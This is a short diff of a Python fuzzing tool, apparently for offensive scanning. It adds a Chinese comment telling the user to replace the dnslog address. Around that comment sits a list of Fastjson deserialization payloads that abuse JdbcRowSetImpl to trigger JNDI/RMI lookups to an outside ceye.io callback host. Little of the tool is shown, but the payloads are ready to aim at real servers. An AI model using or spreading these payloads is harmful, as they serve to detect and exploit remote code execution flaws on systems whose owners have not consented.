@@ -31,7 +31,7 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # 屏蔽ssl警告
 class FuzzLFI:
     def __init__(self):
-        # 这个里面定义各类paylaod
+        # 这个里面定义各类paylaod，记得更换自己的dnslog地址
         self.fastjson = [
             '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fastjson1.m4mta5.ceye.io","autoCommit":true}}',
             '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fastjson2.m4mta5.ceye.io/Object","autoCommit":true}',
